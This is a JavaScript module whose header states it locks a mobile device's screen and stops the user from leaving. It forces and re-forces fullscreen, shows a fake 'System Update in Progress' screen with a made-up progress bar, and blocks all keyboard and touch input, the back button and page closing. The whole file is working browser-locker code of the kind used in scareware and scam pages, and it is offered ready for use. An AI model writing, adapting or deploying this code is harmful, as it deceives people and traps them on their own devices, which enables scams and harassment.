/**
 * Screen Locker Script
 * This script attempts to lock the mobile device screen and prevent user from exiting
 */

// Main Screen Locker object
const ScreenLocker = {
    // Store the original body content
    originalContent: null,
    
    // Store fullscreen state
    isFullscreen: false,
    
    // Initialize the screen locker
    init: function() {
        // Save original content
        this.originalContent = document.body.innerHTML;
        
        // Apply fullscreen
        this.requestFullscreen();
        
        // Disable all inputs and interactions
        this.disableInteractions();
        
        // Create overlay
        this.createOverlay();
        
        // Set up event listeners
        this.setupEventListeners();
        
        // Prevent device sleep if possible
        this.preventSleep();
        
        return true;
    },
    
    // Request fullscreen mode
    requestFullscreen: function() {
        const element = document.documentElement;
        
        if (element.requestFullscreen) {
            element.requestFullscreen();
        } else if (element.mozRequestFullScreen) {
            element.mozRequestFullScreen();
        } else if (element.webkitRequestFullscreen) {
            element.webkitRequestFullscreen();
        } else if (element.msRequestFullscreen) {
            element.msRequestFullscreen();
        }
        
        this.isFullscreen = true;
    },
    
    // Create overlay that blocks interaction
    createOverlay: function() {
        // Create a full-screen overlay div
        const overlay = document.createElement('div');
        overlay.id = 'screen-locker-overlay';
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.97)';
        overlay.style.zIndex = '9999';
        overlay.style.display = 'flex';
        overlay.style.flexDirection = 'column';
        overlay.style.justifyContent = 'center';
        overlay.style.alignItems = 'center';
        overlay.style.color = '#fff';
        overlay.style.fontFamily = 'Arial, sans-serif';
        
        // Add loading animation
        const loader = document.createElement('div');
        loader.style.border = '5px solid #333';
        loader.style.borderTop = '5px solid #3498db';
        loader.style.borderRadius = '50%';
        loader.style.width = '50px';
        loader.style.height = '50px';
        loader.style.animation = 'spin 1s linear infinite';
        loader.style.marginBottom = '20px';
        
        // Add animation style
        const style = document.createElement('style');
        style.textContent = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            @keyframes blink {
                0% { opacity: 1; }
                50% { opacity: 0.5; }
                100% { opacity: 1; }
            }
        `;
        
        // Add message
        const message = document.createElement('div');
        message.textContent = 'System Update in Progress';
        message.style.fontSize = '18px';
        message.style.marginBottom = '10px';
        
        // Add warning
        const warning = document.createElement('div');
        warning.textContent = 'Please do not turn off your device';
        warning.style.fontSize = '14px';
        warning.style.color = '#ff6b6b';
        warning.style.animation = 'blink 2s infinite';
        
        // Add progress bar
        const progressContainer = document.createElement('div');
        progressContainer.style.width = '80%';
        progressContainer.style.height = '20px';
        progressContainer.style.backgroundColor = '#333';
        progressContainer.style.borderRadius = '10px';
        progressContainer.style.margin = '20px 0';
        progressContainer.style.overflow = 'hidden';
        
        const progressBar = document.createElement('div');
        progressBar.id = 'progress-bar';
        progressBar.style.height = '100%';
        progressBar.style.width = '0%';
        progressBar.style.backgroundColor = '#3498db';
        progressBar.style.transition = 'width 0.5s';
        
        progressContainer.appendChild(progressBar);
        
        // Add status text
        const status = document.createElement('div');
        status.id = 'status-text';
        status.textContent = 'Initializing...';
        status.style.fontSize = '14px';
        status.style.marginTop = '10px';
        
        // Assemble overlay
        overlay.appendChild(document.head.appendChild(style));
        overlay.appendChild(loader);
        overlay.appendChild(message);
        overlay.appendChild(warning);
        overlay.appendChild(progressContainer);
        overlay.appendChild(status);
        
        // Add to body
        document.body.appendChild(overlay);
        
        // Start progress animation
        this.animateProgress();
    },
    
    // Animate the progress bar
    animateProgress: function() {
        const progressBar = document.getElementById('progress-bar');
        const statusText = document.getElementById('status-text');
        let progress = 0;
        
        const statusMessages = [
            'Initializing system update...',
            'Checking device compatibility...',
            'Preparing update package...',
            'Installing system components...',
            'Updating security modules...',
            'Configuring system settings...',
            'Finalizing installation...',
            'Restarting services...',
            'Update complete!'
        ];
        
        const interval = setInterval(() => {
            if (progress >= 100) {
                clearInterval(interval);
                statusText.textContent = 'Update complete!';
                return;
            }
            
            progress += Math.random() * 2;
            progress = Math.min(progress, 100);
            progressBar.style.width = `${progress}%`;
            
            // Update status message based on progress
            const messageIndex = Math.floor(progress / (100 / statusMessages.length));
            statusText.textContent = statusMessages[Math.min(messageIndex, statusMessages.length - 1)];
        }, 800);
    },
    
    // Disable all interactions
    disableInteractions: function() {
        // Disable all buttons, links, and inputs
        const elements = document.querySelectorAll('button, a, input, textarea, select');
        elements.forEach(element => {
            element.disabled = true;
            element.style.pointerEvents = 'none';
        });
        
        // Disable scrolling
        document.body.style.overflow = 'hidden';
        document.documentElement.style.overflow = 'hidden';
    },
    
    // Set up event listeners to prevent exiting
    setupEventListeners: function() {
        // Prevent back button
        history.pushState(null, null, document.URL);
        window.addEventListener('popstate', () => {
            history.pushState(null, null, document.URL);
        });
        
        // Prevent context menu (right click)
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Prevent keyboard shortcuts
        document.addEventListener('keydown', e => {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }, true);
        
        // Prevent touch events
        ['touchstart', 'touchmove', 'touchend', 'touchcancel'].forEach(eventType => {
            document.addEventListener(eventType, e => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, { passive: false });
        });
        
        // Prevent exiting fullscreen
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement && this.isFullscreen) {
                this.requestFullscreen();
            }
        });
        
        document.addEventListener('webkitfullscreenchange', () => {
            if (!document.webkitFullscreenElement && this.isFullscreen) {
                this.requestFullscreen();
            }
        });
        
        // Prevent page from being closed
        window.addEventListener('beforeunload', e => {
            e.preventDefault();
            e.returnValue = '';
            return '';
        });
    },
    
    // Prevent device from sleeping
    preventSleep: function() {
        if (navigator.wakeLock) {
            navigator.wakeLock.request('screen')
                .then(lock => {
                    console.log('Wake Lock activated');
                    window.wakeLock = lock;
                })
                .catch(err => {
                    console.error('Wake Lock error:', err);
                });
        }
    }
};

// Export the module if in a CommonJS environment
if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
    module.exports = ScreenLocker;
}